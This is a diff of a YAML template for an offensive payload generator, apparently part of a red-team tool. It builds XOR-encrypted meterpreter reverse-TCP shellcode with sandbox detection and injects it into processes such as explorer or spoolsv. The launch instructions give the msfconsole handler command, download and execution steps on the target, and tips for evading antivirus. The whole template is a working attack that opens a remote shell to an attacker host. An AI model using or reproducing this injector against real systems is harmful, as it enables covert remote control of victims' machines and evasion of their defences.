@@ -3,24 +3,24 @@ meta:
   category: "Process Injection"
   description: |
     Generates XOR-encrypted shellcode and performs classic remote process injection.
-    
+
     Features:
     - XOR encryption for basic obfuscation (key: 0xfa)
     - NUMA-based sandbox detection
     - Automatic target selection based on privilege level
     - Classic CreateRemoteThread injection technique
-    
+
     The injector opens a target process, allocates executable memory, writes
     the decoded shellcode, and creates a remote thread to execute it.
-    
+
     WARNING: For authorized security testing only!
-  
+
   effectiveness: medium
-  
+
   mitre:
     tactic: "TA0005 - Defense Evasion"
     technique: "T1055.001 - Process Injection: Dynamic-link Library Injection"
-  
+
   artifacts:
     - "OpenProcess API calls with PROCESS_ALL_ACCESS"
     - "VirtualAllocEx with PAGE_EXECUTE_READWRITE permissions"
@@ -34,37 +34,37 @@ parameters:
     type: "ip"
     description: "Attacker/C2 server IP address for reverse connection"
     required: true
-  
+
   - name: "lport"
     type: "port"
     description: "Listener port on attacker machine"
     required: true
     default: 443
-  
+
   - name: "default_target"
     type: "string"
     description: "Default target process for non-elevated execution"
     required: false
     default: "explorer"
-  
+
   - name: "elevated_target"
     type: "string"
     description: "Target process when running with administrative privileges"
     required: false
     default: "spoolsv"
-  
+
   - name: "xor_key"
     type: "hex"
     description: "XOR encryption key (single byte, e.g., 'fa')"
     required: false
     default: fa
-  
+
   - name: "output_file"
     type: "string"
     description: "Output executable filename"
     required: false
     default: "injector.exe"
-  
+
   - name: "output_path"
     type: "path"
     description: "Output directory for generated payload"
@@ -77,7 +77,7 @@ preprocessing:
     name: "generate_shellcode"
     command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
     output_var: "raw_shellcode"
-  
+
   # Step 2: XOR encrypt the shellcode
   - type: "script"
     name: "xor_encryption"
@@ -86,7 +86,7 @@ preprocessing:
       data: "{{ raw_shellcode }}"
       key: "{{ xor_key }}"
     output_var: "xor_result"
-  
+
   # Step 3: Format encrypted shellcode as C# byte array
   - type: "script"
     name: "format_payload"
@@ -104,86 +104,67 @@ output:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
   launch_instructions: |
-    # XOR-Encrypted Remote Process Injection - Launch Instructions
-    
-    ## Step 1: Start Metasploit Listener
-    
+    XOR-Encrypted Remote Process Injection - Launch Instructions
+
+    Step 1: Start Metasploit Listener
+
     Start msfconsole and configure the handler:
-    
-    ```bash
-    msfconsole -x "use exploit/multi/handler; \
-                  set payload windows/x64/meterpreter/reverse_tcp; \
-                  set LHOST {{ lhost }}; \
-                  set LPORT {{ lport }}; \
-                  set ExitOnSession false; \
-                  exploit -j"
-    ```
-    
+
+    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+
     Or manually in msfconsole:
-    
-    ```
+
     use exploit/multi/handler
     set payload windows/x64/meterpreter/reverse_tcp
     set LHOST {{ lhost }}
     set LPORT {{ lport }}
     set ExitOnSession false
     exploit -j
-    ```
-    
-    ## Step 2: Transfer Payload to Target
-    
+
+    Step 2: Transfer Payload to Target
+
     Transfer the generated executable to the target Windows system:
-    
-    ```bash
-    # Using Python HTTP server
+
+    Using Python HTTP server
     python3 -m http.server 8080
-    
-    # On target (PowerShell):
+
+    On target (PowerShell):
     Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"
-    ```
-    
-    ## Step 3: Execute on Target
-    
-    ### Option A: Auto-injection (privilege-aware)
+
+    Step 3: Execute on Target
+
+    Option A: Auto-injection (privilege-aware)
     Simply run without arguments - automatically selects target based on privileges:
-    ```
     {{ output_file }}
-    ```
-    
-    ### Option B: Specify target process
+
+    Option B: Specify target process
     Inject into a specific process by name:
-    ```
     {{ output_file }} explorer
     {{ output_file }} notepad
     {{ output_file }} svchost
-    ```
-    
-    ## Step 4: Verify Connection
-    
+
+    Step 4: Verify Connection
+
     Check your Metasploit console for incoming session:
-    ```
     Sending stage (200262 bytes) to [target_ip]
     Meterpreter session 1 opened
-    ```
-    
-    ## Notes:
-    
+
+    Notes:
+
     - Encrypted with XOR key 0x{{ xor_key }} for basic AV evasion
     - Includes NUMA-based sandbox detection
     - Auto-selects target: {{ elevated_target }} (elevated) or {{ default_target }} (normal)
     - Creates remote thread in target process
     - EXITFUNC=thread ensures clean exit without crashing target process
-    
-    ## Troubleshooting:
-    
+
+    Troubleshooting:
+
     - If injection fails: Try different target process (notepad, chrome, etc.)
     - If no connection: Check firewall rules on attacker machine
     - If AV blocks: Consider additional obfuscation or packing
     - Requires matching architecture (x64 payload for x64 process)
-    
-    ## Cleanup:
-    
+
+    Cleanup:
+
     After testing, remove the payload:
-    ```powershell
     Remove-Item {{ output_file }} -Force
-    ```
